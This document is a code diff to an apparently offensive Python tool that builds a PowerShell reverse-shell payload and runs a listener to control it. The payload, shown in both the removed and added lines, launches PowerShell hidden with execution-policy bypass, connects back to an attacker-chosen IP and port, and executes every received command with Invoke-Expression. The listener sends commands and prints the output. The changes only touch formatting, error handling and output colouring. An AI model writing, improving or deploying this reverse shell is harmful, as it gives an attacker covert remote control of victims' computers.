@@ -1,10 +1,11 @@
 import socket
 
 def generate_payload_ps(ip, port, output_file):
-    batch_script_ps = f"""@echo off
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port});$s=$c.GetStream();$w=New-Object System.IO.StreamWriter($s);$w.AutoFlush=$true;$r=New-Object System.IO.StreamReader($s);while($true){{ $cmd=$r.ReadLine();if($cmd -eq $null){{break}};$out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $w.WriteLine($_) }};$w.WriteLine($out) }};$c.Close()"
+    batch_script_ps = f"""
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$c=New-Object System.Net.Sockets.TcpClient('{ip}',{port}); $s=$c.GetStream(); $w=New-Object System.IO.StreamWriter($s); $w.AutoFlush=$true; $r=New-Object System.IO.StreamReader($s); while($true){{ $cmd=$r.ReadLine(); if($cmd -eq $null){{break}}; $out=try{{ Invoke-Expression $cmd 2>&1 | Out-String }}catch{{ $_ }}; $w.WriteLine($out) }}; $c.Close()"
 """
     return batch_script_ps
+
 
 
 def listener(ip, port):
@@ -37,7 +38,7 @@ def listener(ip, port):
 
             client.send(command.encode() + b"\n")
             response = client.recv(4096).decode(errors="ignore")
-            print(response)
+            print("\n\033[38;5;69m",response)
     except (ConnectionResetError, KeyboardInterrupt):
         print("[-] Connection lost.")
     finally:
